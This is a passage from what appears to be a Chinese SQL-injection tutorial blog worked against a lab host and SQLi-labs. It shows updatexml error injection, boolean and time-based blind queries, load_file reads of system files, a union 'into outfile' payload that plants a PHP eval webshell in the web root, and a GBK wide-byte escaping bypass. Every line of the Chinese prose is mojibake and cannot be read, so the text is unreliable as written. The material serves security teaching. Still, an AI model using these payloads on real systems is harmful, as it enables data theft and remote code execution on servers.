src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-13%20%E4%B8%8B%E5%8D%888.13.35.png" style="zoom:75%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-13%20%E4%B8%8B%E5%8D%888.13.45.png" style="zoom:75%;"><p>è·å¾—æ•°æ®åº“ç‰ˆæœ¬å·ã€‚</p><h3 id="5-2-2-updatexml"><a href="#5-2-2-updatexml" class="headerlink" title="5.2.2 updatexml( )"></a>5.2.2 updatexml( )</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?id<span class="token operator">=</span><span class="token number">33</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>, concat<span class="token punctuation">(</span> <span class="token string">'^'</span>, <span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>, <span class="token string">'^'</span><span class="token punctuation">)</span>,1<span class="token punctuation">)</span> --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2025-02-12%2017.55.57.png" style="zoom:50%;"><p>è·å–æ•°æ®åº“åå’Œè·¯å¾„ã€‚</p><h2 id="æ‹“å±•å°ç»“"><a href="#æ‹“å±•å°ç»“" class="headerlink" title="æ‹“å±•å°ç»“"></a>æ‹“å±•å°ç»“</h2><p>æ•°æ®ç±»å‹æº¢å‡º</p><p>XPATHæŠ¥é”™:extractvalue()ã€updatexml()</p><p>ä¸»é”®é‡å¤</p><p>åˆ—åé‡å¤</p><p>å‡ ä½•å‡½æ•°ç¼ºå°‘å‚æ•°</p><h1 id="å…­ã€å¸ƒå°”ç›²æ³¨"><a href="#å…­ã€å¸ƒå°”ç›²æ³¨" class="headerlink" title="å…­ã€å¸ƒå°”ç›²æ³¨"></a>å…­ã€å¸ƒå°”ç›²æ³¨</h1><h2 id="6-1-åŸç†"><a href="#6-1-åŸç†" class="headerlink" title="6.1 åŸç†"></a>6.1 åŸç†</h2><p>åˆ©ç”¨é¡µé¢è¿”å›çš„å¸ƒå°”ç±»å‹çŠ¶æ€ï¼Œæ­£å¸¸æˆ–è€…ä¸æ­£å¸¸ã€‚</p><p>å¦‚æœæ˜¯æ•°å­—å‹ï¼š</p><p>and 1=1 æ­£å¸¸æ˜¾ç¤º</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-13%20%E4%B8%8B%E5%8D%888.24.09.png" style="zoom:45%;"><p>and 1=2 ä¸æ­£å¸¸æ˜¾ç¤º</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-13%20%E4%B8%8B%E5%8D%888.24.53.png" style="zoom:45%;"><h2 id="6-2-æ•°æ®åº“åçˆ†ç ´æ€è·¯-ï¼ˆæˆæœ¬æœ‰ç‚¹é«˜ï¼‰"><a href="#6-2-æ•°æ®åº“åçˆ†ç ´æ€è·¯-ï¼ˆæˆæœ¬æœ‰ç‚¹é«˜ï¼‰" class="headerlink" title="6.2 æ•°æ®åº“åçˆ†ç ´æ€è·¯ ï¼ˆæˆæœ¬æœ‰ç‚¹é«˜ï¼‰"></a>6.2 æ•°æ®åº“åçˆ†ç ´æ€è·¯ ï¼ˆæˆæœ¬æœ‰ç‚¹é«˜ï¼‰</h2><p>and database()=å­—å…¸é¡¹</p><ul><li><p>é”™è¯¯çŒœæµ‹ï¼šä¸æ­£å¸¸æ˜¾ç¤º</p></li><li><p>æ­£ç¡®çŒœæµ‹ï¼šæ­£å¸¸æ˜¾ç¤º</p></li></ul><h2 id="6-3-æ•°æ®åº“åé•¿åº¦çŒœæµ‹"><a href="#6-3-æ•°æ®åº“åé•¿åº¦çŒœæµ‹" class="headerlink" title="6.3 æ•°æ®åº“åé•¿åº¦çŒœæµ‹"></a>6.3 æ•°æ®åº“åé•¿åº¦çŒœæµ‹</h2><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-13%20%E4%B8%8B%E5%8D%888.30.06.png" style="zoom:55%;"><p>å¼‚å¸¸</p><p>åˆ©ç”¨äºŒåˆ†æŸ¥æ‰¾ã€‚</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-13%20%E4%B8%8B%E5%8D%888.31.43.png" style="zoom:55%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-13%20%E4%B8%8B%E5%8D%888.33.33.png" style="zoom:75%;"><p>æ•°æ®åº“åé•¿åº¦ä¸º3ã€‚</p><h2 id="6-4-é€å­—æ¯çŒœæµ‹æ•°æ®åº“å"><a href="#6-4-é€å­—æ¯çŒœæµ‹æ•°æ®åº“å" class="headerlink" title="6.4 é€å­—æ¯çŒœæµ‹æ•°æ®åº“å"></a>6.4 é€å­—æ¯çŒœæµ‹æ•°æ®åº“å</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.33.4/cms/show.php?id<span class="token operator">=</span><span class="token number">33</span> and substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'c'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>çŒœå¯¹çš„æƒ…å†µ:</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-13%20%E4%B8%8B%E5%8D%888.35.27.png" style="zoom:55%;"><p>çŒœé”™çš„æƒ…å†µ:</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-13%20%E4%B8%8B%E5%8D%888.36.13.png" style="zoom:75%;"><p>ä¹Ÿå¯ä»¥è½¬åŒ–ä¸ºasciiç ï¼Œåˆ©ç”¨æ¯”è¾ƒå¤§å°çš„æ–¹æ³•ï¼ŒäºŒåˆ†æŸ¥æ‰¾ç¡®å®šæ¯ä¸€ä½çš„å­—æ¯ã€‚</p><pre class="line-numbers language-BASH" data-language="BASH"><code class="language-BASH">http://192.168.33.4/cms/show.php?id=33 and ascii(substr(database(),1,1))&lt;100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-13%20%E4%B8%8B%E5%8D%888.37.59.png" style="zoom:75%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-13%20%E4%B8%8B%E5%8D%888.38.16.png" style="zoom:75%;"><p>98,99ä¸¤ä¸ªä¹‹é—´ï¼Œå…¶ä»–å­—æ¯é€ä¸ªæ¯”è¾ƒã€‚</p><h1 id="ä¸ƒã€å»¶æ—¶æ³¨å…¥"><a href="#ä¸ƒã€å»¶æ—¶æ³¨å…¥" class="headerlink" title="ä¸ƒã€å»¶æ—¶æ³¨å…¥"></a>ä¸ƒã€å»¶æ—¶æ³¨å…¥</h1><p>å¯èƒ½ä¼šå—ç½‘ç»œç¯å¢ƒçš„å½±å“ã€‚</p><h2 id="7-1-åŸç†"><a href="#7-1-åŸç†" class="headerlink" title="7.1 åŸç†"></a>7.1 åŸç†</h2><p>åˆ©ç”¨sleep( )è¯­å¥çš„å»¶æ—¶æ€§ï¼Œä»¥æ—¶é—´çº¿ä½œä¸ºåˆ¤æ–­æ¡ä»¶ã€‚</p><h2 id="7-2-è·å–æ•°æ®åº“å"><a href="#7-2-è·å–æ•°æ®åº“å" class="headerlink" title="7.2 è·å–æ•°æ®åº“å"></a>7.2 è·å–æ•°æ®åº“å</h2><ul><li>è·å–æ•°æ®åº“åé•¿åº¦</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?id<span class="token operator">=</span><span class="token number">33</span> and if<span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span> ,sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.33.4/cms/show.php??id<span class="token operator">=</span><span class="token number">33</span> and if<span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token operator">&lt;</span><span class="token number">10</span>,sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>,1<span class="token punctuation">)</span> --+http://192.168.33.4/cms/show.php?id<span class="token operator">=</span><span class="token number">33</span> and if<span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token operator">=</span><span class="token number">2</span>,sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>çŒœå¯¹äº†åˆ™ä¼šäº§ç”Ÿå»¶æ—¶ï¼ŒçŒœé”™äº†æ²¡æœ‰å»¶æ—¶ã€‚ä¹‹åï¼Œç±»æ¯”äºå¸ƒå°”ç›²æ³¨çš„æ–¹å¼ï¼Œå¯ä»¥è·å¾—æƒ³è¦çš„ä¿¡æ¯ã€‚</p><p> å¸ƒå°”ç›²æ³¨å’Œå»¶æ—¶æ³¨å…¥éƒ½å±äºç›²æ³¨ï¼Œè¿‡ç¨‹å…·æœ‰å¼ºçƒˆçš„è§„å¾‹æ€§ï¼Œå¯ä»¥ç”¨pythonè„šæœ¬å®ç°è‡ªåŠ¨åŒ–çš„å¸ƒå°”ç›²æ³¨å’Œå»¶æ—¶æ³¨å…¥ã€‚</p><h1 id="å…«ã€åˆ©ç”¨SQLæ³¨å…¥æ¼æ´è¯»å†™æ–‡ä»¶"><a href="#å…«ã€åˆ©ç”¨SQLæ³¨å…¥æ¼æ´è¯»å†™æ–‡ä»¶" class="headerlink" title="å…«ã€åˆ©ç”¨SQLæ³¨å…¥æ¼æ´è¯»å†™æ–‡ä»¶"></a>å…«ã€åˆ©ç”¨SQLæ³¨å…¥æ¼æ´è¯»å†™æ–‡ä»¶</h1><h2 id="8-1-å‰ææ¡ä»¶"><a href="#8-1-å‰ææ¡ä»¶" class="headerlink" title="8.1 å‰ææ¡ä»¶"></a>8.1 å‰ææ¡ä»¶</h2><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨SQLæ³¨å…¥æ¼æ´è¯»å†™æ–‡ä»¶ã€‚ä½†æ˜¯è¯»å†™æ–‡ä»¶éœ€è¦ä¸€å®šçš„æ¡ä»¶ã€‚</p><h3 id="8-1-1-æ¡ä»¶ä¸€ï¼šsecure-file-privå€¼ä¸ºç©º"><a href="#8-1-1-æ¡ä»¶ä¸€ï¼šsecure-file-privå€¼ä¸ºç©º" class="headerlink" title="8.1.1 æ¡ä»¶ä¸€ï¼šsecure-file-privå€¼ä¸ºç©º"></a>8.1.1 æ¡ä»¶ä¸€ï¼šsecure-file-privå€¼ä¸ºç©º</h3><ul><li>å‚æ•°ä»‹ç»</li></ul><p>å¯ä»¥åœ¨phpmyadminä¸­çœ‹åˆ°è¯¥å˜é‡:</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%886.05.03.png" style="zoom:35%;"><p>è¯¥å‚æ•°åœ¨é«˜ç‰ˆæœ¬çš„mysqlæ•°æ®åº“ä¸­é™åˆ¶äº†æ–‡ä»¶çš„å¯¼å…¥å¯¼å‡ºæ“ä½œã€‚è¯¥å‚æ•°å¯ä»¥å†™åœ¨my.inié…ç½®æ–‡ä»¶ä¸­[mysqld]ä¸‹ã€‚è‹¥è¦é…ç½®æ­¤å‚æ•°ï¼Œéœ€è¦ä¿®æ”¹my.inié…ç½®æ–‡ä»¶ï¼Œå¹¶é‡å¯mysqlæœåŠ¡ã€‚</p><ul><li>å…³äºè¯¥å‚æ•°å€¼çš„ç›¸å…³è¯´æ˜</li></ul><table><thead><tr><th>secure-file-priv å‚æ•°é…ç½®</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>secure-file-priv=</td><td>ä¸å¯¹mysq ldçš„å¯¼å…¥å¯¼å‡ºæ“ä½œåšé™åˆ¶</td></tr><tr><td>secure-file-priv=â€™c:/a/ â€˜</td><td>é™åˆ¶mysqldçš„å¯¼å…¥å¯¼å‡ºæ“ä½œå‘ç”Ÿåœ¨C:/a/ä¸‹ (å­ç›®å½•æœ‰æ•ˆ)</td></tr><tr><td>secure-file-priv=null</td><td>é™åˆ¶mysqldä¸å…è®¸å¯¼å…¥å¯¼å‡ºæ“ä½œ</td></tr></tbody></table><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œé…ç½®æ–‡ä»¶é‡Œé¢æ²¡æœ‰é…ç½®è¿™ä¸ªå‚æ•°ï¼Œé»˜è®¤å€¼ä¸ºnullã€‚</p><ul><li>é…ç½®å‚æ•°</li></ul><p>1ï¼‰æ‰¾åˆ°é…ç½®æ–‡ä»¶ï¼š</p><p><code>C:\phpstudy\MySQL\my.iniï¼š</code></p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%886.09.10.png" style="zoom:75%;"><p>2ï¼‰å°†å‚æ•°é…ç½®åœ¨mysqldä¸‹:</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%886.10.41.png" style="zoom:80%;"><p>3ï¼‰é‡å¯WAMPã€‚</p><p>è¯¥å˜é‡çš„å€¼ä¸ºç©ºï¼Œæ„å‘³ç€å¯ä»¥è¿›è¡Œå¯¼å…¥å¯¼å‡ºæ“ä½œã€‚</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%886.11.42.png" style="zoom:65%;"><h3 id="8-1-2-æ¡ä»¶äºŒï¼šå½“å‰ç”¨æˆ·å…·æœ‰æ–‡ä»¶æƒé™"><a href="#8-1-2-æ¡ä»¶äºŒï¼šå½“å‰ç”¨æˆ·å…·æœ‰æ–‡ä»¶æƒé™" class="headerlink" title="8.1.2 æ¡ä»¶äºŒï¼šå½“å‰ç”¨æˆ·å…·æœ‰æ–‡ä»¶æƒé™"></a>8.1.2 æ¡ä»¶äºŒï¼šå½“å‰ç”¨æˆ·å…·æœ‰æ–‡ä»¶æƒé™</h3><p>æŸ¥è¯¢è¯­å¥ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">select</span> File_priv from mysql.user where <span class="token assign-left variable">user</span><span class="token operator">=</span><span class="token string">"root"</span> and <span class="token assign-left variable">host</span><span class="token operator">=</span><span class="token string">"localhost"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ¤æ–­å½“å‰rootç”¨æˆ·æ˜¯å¦å…·æœ‰æ–‡ä»¶æ“ä½œæƒé™ã€‚</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%886.16.24.png" style="zoom:55%;"><h3 id="8-1-3-æ¡ä»¶ä¸‰ï¼šçŸ¥é“è¦å†™å…¥ç›®æ ‡æ–‡ä»¶çš„ç»å¯¹è·¯å¾„"><a href="#8-1-3-æ¡ä»¶ä¸‰ï¼šçŸ¥é“è¦å†™å…¥ç›®æ ‡æ–‡ä»¶çš„ç»å¯¹è·¯å¾„" class="headerlink" title="8.1.3 æ¡ä»¶ä¸‰ï¼šçŸ¥é“è¦å†™å…¥ç›®æ ‡æ–‡ä»¶çš„ç»å¯¹è·¯å¾„"></a>8.1.3 æ¡ä»¶ä¸‰ï¼šçŸ¥é“è¦å†™å…¥ç›®æ ‡æ–‡ä»¶çš„ç»å¯¹è·¯å¾„</h3><p>æ˜¾ç„¶ï¼Œåªæœ‰çŸ¥é“è¦å†™å…¥ç›®æ ‡æ–‡ä»¶çš„ç»å¯¹è·¯å¾„æ‰èƒ½å†™å…¥ã€‚</p><h2 id="8-2-è¯»å–æ–‡ä»¶æ“ä½œ"><a href="#8-2-è¯»å–æ–‡ä»¶æ“ä½œ" class="headerlink" title="8.2 è¯»å–æ–‡ä»¶æ“ä½œ"></a>8.2 è¯»å–æ–‡ä»¶æ“ä½œ</h2><p>SQLæ³¨å…¥æ¼æ´ç¡®è®¤ï¼š</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2025-02-13%2011.40.20.png" style="zoom:50%;"><p>åˆ©ç”¨æ³¨å…¥æ¼æ´è¯»å–æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1</span>,load_file<span class="token punctuation">(</span> <span class="token string">'C:\\Windows\\System32\\drivers\\etc\\hosts'</span><span class="token punctuation">)</span>, <span class="token number">3</span>--+load_file<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>çš„è·¯å¾„å¯ä»¥æ˜¯ï¼šC:<span class="token punctuation">\</span><span class="token punctuation">\</span>Windowsl<span class="token punctuation">\</span><span class="token punctuation">\</span>System32<span class="token punctuation">\</span><span class="token punctuation">\</span>drivers<span class="token punctuation">\</span><span class="token punctuation">\</span>etc<span class="token punctuation">\</span><span class="token punctuation">\</span>hostsæˆ–C:/Windows/System32/drivers/etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.04.37.png" style="zoom:75%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.04.59.png" style="zoom:75%;"><h2 id="8-3-å†™å…¥æ–‡ä»¶æ“ä½œ"><a href="#8-3-å†™å…¥æ–‡ä»¶æ“ä½œ" class="headerlink" title="8.3 å†™å…¥æ–‡ä»¶æ“ä½œ"></a>8.3 å†™å…¥æ–‡ä»¶æ“ä½œ</h2><ul><li>payloadç¤ºä¾‹</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and 1=2 union select 1,'</span><span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">777</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">&gt;</span><span class="token string">',3 into outfile '</span>c:<span class="token punctuation">\</span><span class="token punctuation">\</span>phpstudy<span class="token punctuation">\</span><span class="token punctuation">\</span>www<span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">1</span>.php'--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¡µé¢å¦‚æœä¸æŠ¥é”™è¯´æ˜å†™å…¥æˆåŠŸï¼ŒæŠ¥é”™ä¹Ÿä¸ä¸€å®šå°±æ²¡å†™å…¥æˆåŠŸã€‚</p><p>ç›´æ¥è®¿é—®å†™å…¥çš„æ–‡ä»¶<code>http://ip/1.php</code></p><ul><li>å®éªŒæµ‹è¯•ï¼š</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.10.19.png" style="zoom:75%;"><p>æ‰§è¡Œå®Œç¬¬ä¸€æ¬¡ä¼šæŠ¥ä¸€ä¸ªé”™è¯¯ï¼Œå†æ‰§è¡Œä¸€æ¬¡æç¤ºæ–‡ä»¶å·²å­˜åœ¨ã€‚</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.10.43.png" style="zoom:75%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.10.55.png" style="zoom:75%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.11.09.png" style="zoom:75%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.14.41.png" style="zoom:35%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.14.24.png" style="zoom:75%;"><h1 id="ä¹ã€å®½å­—èŠ‚æ³¨å…¥"><a href="#ä¹ã€å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="ä¹ã€å®½å­—èŠ‚æ³¨å…¥"></a>ä¹ã€å®½å­—èŠ‚æ³¨å…¥</h1><p>å®½å­—èŠ‚æ³¨å…¥å‡†ç¡®æ¥è¯´ä¸æ˜¯æ³¨å…¥æ‰‹æ³•ï¼Œè€Œæ˜¯å¦å¤–ä¸€ç§æ¯”è¾ƒç‰¹æ®Šçš„æƒ…å†µã€‚ä¸ºäº†è¯´æ˜å®½å­—èŠ‚æ³¨å…¥é—®é¢˜ï¼Œæˆ‘ä»¬ä»¥SQLi-labs 32å…³ä¸ºä¾‹å­ã€‚</p><h2 id="9-1-SQLi-labs-less32"><a href="#9-1-SQLi-labs-less32" class="headerlink" title="9.1 SQLi-labs-less32"></a>9.1 SQLi-labs-less32</h2><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.20.17.png" style="zoom:35%;"><p>ä½¿ç”¨<code>?id=1'</code>è¿›è¡Œæµ‹è¯•çš„æ—¶å€™ï¼Œå‘ç°æäº¤çš„å•å¼•å·ä¼šè¢«è½¬è¯‘<code>\'</code>ã€‚æ­¤æ—¶ï¼Œè½¬ä¹‰åçš„å•å¼•å·ä¸å†æ˜¯å­—ç¬¦ä¸²çš„æ ‡è¯†ï¼Œä¼šè¢«ä½œä¸ºæ™®é€šå­—ç¬¦å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æäº¤çš„å•å¼•å·ä¸ä¼šå½±å“åˆ°åŸæ¥SQLè¯­å¥çš„ç»“æ„ã€‚</p><ul><li>å›æ˜¾æµ‹è¯•ï¼šâœ…</li></ul><p><code>?id=1</code></p><p><code>?id=2</code></p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.21.48.png" style="zoom:55%;"><ul><li>åˆ¤æ–­æ•°å­—å‹è¿˜æ˜¯å­—ç¬¦å‹ï¼š</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.22.39.png" style="zoom:75%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.22.59.png" style="zoom:55%;"><p>å•å¼•å·è¢«è½¬ä¸º<code>2\'</code>ã€‚</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.23.59.png" style="zoom:75%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.24.08.png" style="zoom:55%;"><p>åŒå¼•å·ä¹Ÿè¢«è½¬è¯‘äº†ã€‚</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.26.45.png" style="zoom:75%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.26.53.png" style="zoom:45%;"><p>ç‰¹æ®Šå­—ç¬¦å‡è¢«è½¬è¯‘ã€‚</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.48.45.png" style="zoom:55%;"><blockquote><ol><li><pre><code class="php">$string = preg_replace('/'.preg_quote('\\').'/'.$, "\\\\\\\\", $string);<pre class="line-numbers language-none"><code class="language-none">   - `preg_quote('\\')`ï¼šè¿™ä¸ªå‡½æ•°ä¼šè½¬ä¹‰æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼Œè¿™é‡Œè½¬ä¹‰çš„æ˜¯åæ–œæ `\`ã€‚   - `/'.preg_quote('\\').'/'.$`ï¼šæ„å»ºä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼ŒåŒ¹é…ä¸€ä¸ªåæ–œæ ã€‚   - `"\\\\\\\\"`ï¼šè¿™æ˜¯æ›¿æ¢å­—ç¬¦ä¸²ï¼Œå®ƒå°†æ¯ä¸ªåæ–œæ æ›¿æ¢ä¸ºä¸¤ä¸ªåæ–œæ ï¼ˆåœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œä¸€ä¸ªåæ–œæ éœ€è¦è¢«è½¬ä¹‰ä¸ºä¸¤ä¸ªåæ–œæ ï¼‰ã€‚   - `$string`ï¼šè¿™æ˜¯è¦å¤„ç†çš„åŸå§‹å­—ç¬¦ä¸²ã€‚2. ```php   $string = preg_replace('/\/i', '\\\'', $string);   $string = preg_replace('/\"/', "\\\\\"", $string);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>è½¬è¯‘å•åŒå¼•å·ã€‚</code></pre></li></ol></blockquote><p>æƒ³æ³•ï¼šè®©è½¬è¯‘å¤±æ•ˆã€‚</p><p>é˜…è¯»32å…³çš„æºç ï¼Œå‘ç°å‡ å¥éå¸¸æ„æ€çš„ä»£ç ï¼Œå¦‚ä¸‹ã€‚</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.50.59.png" style="zoom:75%;"><p>æ­¤ç½‘é¡µåœ¨è¿æ¥æ•°æ®åº“æ—¶ï¼Œä¼šå°†å­—ç¬¦ç¼–ç è®¾ç½®ä¸ºGBKç¼–ç é›†åˆï¼Œç„¶åè¿›è¡ŒSQLè¯­å¥æ‹¼æ¥ï¼Œæœ€åè¿›è¡Œæ•°æ®åº“æŸ¥è¯¢ã€‚</p><blockquote><h4 id="GBKç¼–ç ï¼š"><a href="#GBKç¼–ç ï¼š" class="headerlink" title="GBKç¼–ç ï¼š"></a>GBKç¼–ç ï¼š</h4><p>GBKç¼–ç é‡‡ç”¨åŒå­—èŠ‚ç¼–ç æ–¹æ¡ˆï¼Œå…¶ç¼–ç èŒƒå›´: 8140- FEFEï¼Œ å‰”é™¤xx7Fç ä½ï¼Œå…±23940ä¸ªç ä½å…±æ”¶å½•æ±‰å­—å’Œå›¾å½¢ç¬¦å·21886ä¸ªï¼Œå…¶ä¸­æ±‰å­—(åŒ…æ‹¬éƒ¨é¦–å’Œæ„ä»¶) 21003ä¸ªï¼Œå›¾å½¢ç¬¦å·883ä¸ªã€‚ GBKç¼–ç æ”¯æŒå›½é™…æ ‡å‡†ISO/ IEC10646-1å’Œå›½å®¶æ ‡å‡†GB13000-1ä¸­çš„å…¨éƒ¨ä¸­æ—¥éŸ©æ±‰å­—ï¼Œå¹¶åŒ…å«äº†BIG5ç¼–ç ä¸­çš„æ‰€æœ‰æ±‰å­—ã€‚GBKç¼–ç æ–¹æ¡ˆäº1995å¹´12æœˆ15æ—¥æ­£å¼å‘å¸ƒï¼Œè¿™ä¸€ç‰ˆçš„GBKè§„èŒƒä¸º1.0ç‰ˆã€‚</p><p>è½¬è¯‘å­—ç¬¦<code>\</code>çš„ç¼–ç æ˜¯<code>5c</code>ï¼Œ æ­£å¥½åœ¨GBKç¼–ç èŒƒå›´ä¹‹å†… ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥åœ¨å•å¼•å·ä¹‹å‰æäº¤ä¸€ä¸ªåå…­è¿›åˆ¶ç¼–ç çš„å­—ç¬¦ï¼Œä¸5cç»„æˆä¸€ä¸ªGBKç¼–ç çš„æ±‰å­—ã€‚è¿™æ ·SQLè¯­å¥ä¼ å…¥æ•°æ®åº“çš„æ—¶å€™ï¼Œè½¬è¯‘å­—ç¬¦5cï¼Œä¼šè¢«çœ‹ä½œGBKæ±‰å­—çš„ä½ä½å­—èŠ‚ç¼–ç ï¼Œä»è€Œå¤±å»è½¬è¯‘çš„ä½œç”¨ã€‚</p><p>å¦‚æœæˆ‘ä»¬æäº¤è¿™æ ·çš„å‚æ•°<code>?id=1000%df' union select 1,2,3 --+</code>ï¼Œå°±å¯ä»¥ä½¿ç”¨è”åˆæŸ¥è¯¢è¿›è¡Œæ³¨å…¥äº†ã€‚</p><ul><li><p>0xdf5c 